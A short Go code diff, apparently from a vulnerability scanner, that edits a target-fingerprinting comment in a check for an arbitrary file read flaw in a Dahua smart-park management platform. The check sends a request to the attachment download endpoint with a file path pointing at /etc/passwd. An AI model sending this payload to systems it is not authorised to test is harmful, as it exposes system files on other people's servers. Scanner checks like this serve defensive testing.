@@ -7,7 +7,7 @@ import (
 )
 
 // 测绘语法
-// app="dahua-智慧园区综合管理平台"
+// "attachment_downloadByUrlAtt.action"
 func Dahua_attachment_downloadByUrlAtt_file_read(u string) bool {
 
 	if req, err := pkg.HttpRequset(u+"/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd", "GET", "", false, nil); err == nil {
